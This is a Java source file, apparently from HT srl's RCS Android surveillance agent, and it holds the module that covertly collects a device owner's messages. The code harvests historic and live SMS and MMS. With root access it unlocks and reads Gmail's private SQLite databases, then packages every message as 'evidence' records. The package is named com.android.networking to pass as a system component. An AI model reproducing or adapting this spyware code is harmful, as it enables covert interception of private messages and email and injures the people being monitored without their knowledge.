/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MessageAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.concurrent.Semaphore;

import com.android.networking.Messages;
import com.android.networking.ProcessInfo;
import com.android.networking.ProcessStatus;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ChildConf;
import com.android.networking.conf.ConfModule;
import com.android.networking.conf.ConfigurationException;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.Markup;
import com.android.networking.file.AutoFile;
import com.android.networking.file.Path;
import com.android.networking.interfaces.Observer;
import com.android.networking.listener.ListenerProcess;
import com.android.networking.listener.ListenerSms;
import com.android.networking.module.email.Email;
import com.android.networking.module.message.Filter;
import com.android.networking.module.message.Mms;
import com.android.networking.module.message.MmsBrowser;
import com.android.networking.module.message.MsgHandler;
import com.android.networking.module.message.Sms;
import com.android.networking.module.message.SmsBrowser;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;
import com.android.networking.util.DateTime;
import com.android.networking.util.Utils;
import com.android.networking.util.WChar;

/**
 * The Class MessageAgent.
 * 
 * @author zeno -> Ahahah ti piacerebbe eh?? :>
 * @real-author Que, r0x -> vantatene pure.
 * @bug-sterminator zeno
 */
public class ModuleMessage extends BaseModule implements Observer<Sms> {
	private static final String TAG = "ModuleMessage"; //$NON-NLS-1$
	//$NON-NLS-1$
	private static final int SMS_VERSION = 2010050501;
	private static final int MAIL_VERSION2 = 2012030601;
	private static final int ID_MAIL = 0;
	private static final int ID_SMS = 1;
	private static final int ID_MMS = 2;
	private static final int MAIL_PROGRAM = 1;
	private boolean mailEnabled;
	private boolean smsEnabled;
	private boolean mmsEnabled;

	MsgHandler msgHandler;

	Markup storedMMS;
	Markup storedSMS;
	Markup storedMAIL;

	private Markup configMarkup;
	private Hashtable<String, Integer> lastMail = new Hashtable<String, Integer>();
	private int lastMMS;
	private int lastSMS;
	private Filter[] filterCollect = new Filter[3];
	private Filter[] filterRuntime = new Filter[3];

	// private SmsHandler smsHandler;

	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(NEVER);
		setDelay(100);

		storedMMS = new Markup(this, 1);
		storedSMS = new Markup(this, 2);
		storedMAIL = new Markup(this, 4);
		configMarkup = new Markup(this, 3);

		String[] config = new String[] { "", "", "" };
		String[] oldConfig = new String[] { "", "", "" };
		if (configMarkup.isMarkup()) {
			try {
				oldConfig = (String[]) configMarkup.readMarkupSerializable();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): config size: " + oldConfig.length);
				}
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse) Error: " + e);
				}
				oldConfig = new String[] { "", "", "" };
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse): no oldConfig available");
			}
		}

		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
		try {

			mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
			smsEnabled = readJson(ID_SMS, Messages.getString("18_7"), conf, config);
			mmsEnabled = readJson(ID_MMS, Messages.getString("18_9"), conf, config);

			if (!config[ID_MAIL].equals(oldConfig[ID_MAIL])) {
				storedMAIL.removeMarkup();
			}

			if (!config[ID_SMS].equals(oldConfig[ID_SMS])) {
				// configSmsChanged = true;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): remove SMS markup");
				}
				storedSMS.removeMarkup();
			}

			if (!config[ID_MMS].equals(oldConfig[ID_MMS])) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): remove MMS markup");
				}
				storedMMS.removeMarkup();
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse): updating configMarkup");
			}
			configMarkup.writeMarkupSerializable(config);

		} catch (ConfigurationException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}

		return true;
	}

	private boolean readJson(int id, String child, ConfModule jsonconf, String[] config) throws ConfigurationException {
		ChildConf mailJson = jsonconf.getChild(child); //$NON-NLS-1$
		boolean enabled = mailJson.getBoolean(Messages.getString("18_2")); //$NON-NLS-1$
		String digestConfMail = child + "_" + enabled;

		if (enabled) {
			ChildConf filter = mailJson.getChild(Messages.getString("18_3")); //$NON-NLS-1$
			boolean history = filter.getBoolean(Messages.getString("18_4")); //$NON-NLS-1$
			int maxSizeToLog = 4096;
			digestConfMail += "_" + history;
			if (history) {
				Date from = filter.getDate(Messages.getString("18_5")); //$NON-NLS-1$
				Date to = filter.getDate(Messages.getString("18_6"), null); //$NON-NLS-1$
				// sizeToLog =

				filterCollect[id] = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
				digestConfMail += "_" + from + "_" + to;
			}
			filterRuntime[id] = new Filter(enabled, maxSizeToLog);

		}

		config[id] = digestConfMail;

		return enabled;
	}

	class ProcessMailObserver implements Observer<ProcessInfo> {

		private String pObserving="com.google.android.gm";

		@Override
		public int notification(ProcessInfo process) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): " + process);
			}
			if (process.processInfo.processName.contains(pObserving)) {
				if (process.status == ProcessStatus.STOP) {
					try {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
						}
						readHistoricMail(lastMail);
					} catch (IOException e) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (notification) Error: " + e);
						}
					}
				}
			}
			return 0;
		}

	}

	ProcessMailObserver obs;

	@Override
	public void actualStart() {

		obs = new ProcessMailObserver();

		if (mailEnabled) {
			initMail();
			ListenerProcess.self().attach(obs);
		}

		if (smsEnabled) {
			initSms();
		}

		if (mmsEnabled) {
			initMms();
		}

		if (smsEnabled || mmsEnabled) {
			// Iniziamo la cattura live
			ListenerSms.self().attach(this);
			msgHandler = new MsgHandler(smsEnabled, mmsEnabled);
			msgHandler.start();
		}

	}

	@Override
	public void actualStop() {

		if (mailEnabled) {
			initMail();
			if (obs != null) {
				ListenerProcess.self().detach(obs);
				obs = null;
			}
		}

		if (smsEnabled) {
			ListenerSms.self().detach(this);
		}
		if (msgHandler != null) {
			msgHandler.quit();
		}

	}

	@Override
	public void actualGo() {
		/*
		if (mailEnabled) {
			try {
				readHistoricMail(lastMail);
			} catch (IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (initMail) Error: " + e);
				}
			}
		}*/
	}

	private void initMail() {
		lastMail = storedMAIL.unserialize(new Hashtable<String, Integer>());

		try {
			readHistoricMail(lastMail);
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (initMail) Error: " + e);
			}
		}

	}

	private void initSms() {
		if (storedSMS.isMarkup()) {
			try {
				lastSMS = (Integer) storedSMS.readMarkupSerializable();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (initSms): lastSMS: " + lastSMS);
				}
			} catch (Exception e) {
				storedSMS.removeMarkup();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart) Error reading markup: " + e);
				}
			}
		}

		int mylastSMS = readHistoricSms(lastSMS);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (initSms): next lastSMS: " + mylastSMS);
		}
		updateMarkupSMS(mylastSMS);

		/*
		 * if (!storedSMS.isMarkup()) { int lastSMS = readHistoricSms();
		 * storedSMS.createEmptyMarkup(); }
		 */
	}

	private void initMms() {
		if (storedMMS.isMarkup()) {
			try {
				lastMMS = (Integer) storedMMS.readMarkupSerializable();
			} catch (Exception e) {
				storedMMS.removeMarkup();
				lastMMS = readHistoricMms(lastMMS);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart) Error reading markup: " + e);
				}
			}
		}

		lastMMS = readHistoricMms(lastMMS);

		updateMarkupMMS(lastMMS);
	}

	public synchronized void updateMarkupMMS(int value) {
		try {
			lastMMS = value;
			storedMMS.writeMarkupSerializable(new Integer(value));
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupMMS) Error: " + e);
			}
		}
	}

	public synchronized void updateMarkupSMS(int value) {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupSMS): " + value);
			}
			lastSMS = value;
			storedSMS.writeMarkupSerializable(new Integer(value));
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupSMS) Error: " + e);
			}
		}
	}

	private void updateMarkupMail(String mailstore, int lastId) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateMarkupMail), mailStore: " + mailstore + " +lastId: " + lastId);
		}

		lastMail.put(mailstore, lastId);
		try {
			storedMAIL.writeMarkupSerializable(lastMail);
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupMail) Error: " + e);
			}
		}
	}

	Semaphore stillReadingEmail = new Semaphore(1);

	private int readHistoricMail(Hashtable<String, Integer> lastMail) throws IOException {

		if (stillReadingEmail.tryAcquire()) {

			try {
				// i_1=/data/data/com.google.android.gm/databases
				String databasePath = Messages.getString("i_1");

				String[] mailstores = getMailStores(databasePath);
				for (String mailstore : mailstores) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readHistoricMail) mailstore: " + mailstore);
					}

					AutoFile file = new AutoFile(mailstore);

					GmailVisitor visitor = new GmailVisitor(this, mailstore);
					GenericSqliteHelper helper = GenericSqliteHelper.open(databasePath, mailstore);

					int lastId = lastMail.containsKey(mailstore) ? lastMail.get(mailstore) : 0;
					visitor.lastId = lastId;

					// i_2=messages
					// Messages.getString("i_2")
					int newLastId = helper.traverseRecords("messages", visitor);

					if(newLastId > lastId){
						updateMarkupMail(mailstore, lastId);
					}
				}
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readHistoricMail) Error: " + ex);
				}
			} finally {
				stillReadingEmail.release();
			}
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readHistoricMail), still reading...");
			}
		}

		return 0;
	}

	private String[] getMailStores(String databasePath) {
		File file = new File(databasePath);
		File parent = new File(file.getParent());

		Path.unprotect(parent.getParent());
		Path.unprotect(parent.getAbsolutePath());
		Path.unprotect(file.getAbsolutePath());

		FilenameFilter filter = new FilenameFilter() {
			public boolean accept(File directory, String fileName) {
				// i_3=mailstore.
				return fileName.endsWith(".db") && fileName.startsWith(Messages.getString("i_3"));
			}
		};

		String[] mailstores = file.list(filter);
		return mailstores;
	}

	private int readHistoricMms(int lastMMS) {
		final MmsBrowser mmsBrowser = new MmsBrowser();
		final ArrayList<Mms> listMms = mmsBrowser.getMmsList(lastMMS);
		final Iterator<Mms> iterMms = listMms.listIterator();

		while (iterMms.hasNext()) {
			try {
				final Mms mms = iterMms.next();
				mms.print();
				if (Cfg.DEBUG) {
					Check.asserts(filterCollect[ID_MMS] != null,
							" (readHistoricMms) Assert failed: filterCollect[ID_MMS] null");
				}
				if (filterCollect[ID_MMS].filterMessage(mms.getDate(), mms.getSize(), 0) == Filter.FILTERED_OK) {
					saveMms(mms);
				}
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readHistoricMms) Error: " + ex);
				}
			}
		}

		return mmsBrowser.getMaxId();
	}

	private int readHistoricSms(int lastSMS) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (begin): historic sms harvesting");//$NON-NLS-1$
		}

		final SmsBrowser smsBrowser = new SmsBrowser();
		final ArrayList<Sms> listSms = smsBrowser.getSmsList(lastSMS);
		final Iterator<Sms> iterSms = listSms.listIterator();

		while (iterSms.hasNext()) {
			final Sms s = iterSms.next();
			if (Cfg.DEBUG) {
				Check.asserts(filterCollect[ID_SMS] != null,
						" (readHistoricMms) Assert failed: filterCollect[ID_SMS] null");
			}

			if (filterCollect[ID_SMS].filterMessage(s.getDate(), s.getSize(), 0) == Filter.FILTERED_OK) {
				saveSms(s);
			}
		}

		return smsBrowser.getMaxId();
	}

	private void saveSms(Sms sms) {
		final String address = sms.getAddress();
		final byte[] body = WChar.getBytes(sms.getBody());
		final long date = sms.getDate();
		final boolean sent = sms.getSent();

		saveEvidence(address, body, date, sent);
	}

	private void saveMms(Mms mms) {
		if (!mms.isValid()) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveMms) Error: mms not valid");
			}

			return;
		}
		final String address = mms.getAddress();
		// MMS Subject:
		final byte[] subject = WChar.getBytes(Messages.getString("10_1") + mms.getSubject() + "\n"
				+ Messages.getString("10_4") + mms.getBody()); //$NON-NLS-1$
		final long date = mms.getDate();

		final boolean sent = mms.getSent();

		saveEvidence(address, subject, date, sent);
	}

	public void saveEmail(Email message) {
		int maxMessageSize = Integer.MAX_VALUE;
		final String mail = message.makeMimeMessage(maxMessageSize);

		Check.asserts(mail != null, "Null mail"); //$NON-NLS-1$

		int size = mail.length();
		final int flags = message.isIncoming() ? 0x10 : 0x0;

		final DateTime filetime = new DateTime(message.getReceivedDate());

		final byte[] additionalData = new byte[24];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, 24);
		databuffer.writeInt(MAIL_VERSION2);
		databuffer.writeInt(flags);
		databuffer.writeInt(size);
		databuffer.writeLong(filetime.getFiledate());
		databuffer.writeInt(MAIL_PROGRAM);

		Check.asserts(additionalData.length == 24, "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$

		try {
			EvidenceReference.atomic(EvidenceType.MAIL_RAW, additionalData, mail.getBytes("UTF-8"));
		} catch (UnsupportedEncodingException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveEmail) Error: " + e);
			}
		} //$NON-NLS-1$

	}

	private void saveEvidence(String address, byte[] body, long date, boolean sent) {

		String from, to;

		int flags;

		if (sent) {
			flags = 0;
			from = Messages.getString("10_2"); //$NON-NLS-1$
			to = address;
		} else {
			flags = 1;
			to = Messages.getString("10_2"); //$NON-NLS-1$
			from = address;
		}

		final int additionalDataLen = 48;
		final byte[] additionalData = new byte[additionalDataLen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalDataLen);
		databuffer.writeInt(SMS_VERSION);
		databuffer.writeInt(flags);

		final DateTime filetime = new DateTime(new Date(date));
		databuffer.writeLong(filetime.getFiledate());
		databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
		databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));

		EvidenceReference.atomic(EvidenceType.SMS_NEW, additionalData, body);
	}

	public int notification(Sms s) {
		// Live SMS
		saveSms(s);
		return 0;
	}

	public int notification(Mms mms) {
		// Live MMS
		saveMms(mms);
		int id = mms.getId();
		updateMarkupMMS(id);

		return 0;
	}

	public synchronized int getLastManagedMmsId() {
		return lastMMS;
	}

	public synchronized int getLastManagedSmsId() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (getLastManagedSmsId): " + lastSMS);
		}
		return lastSMS;
	}
}
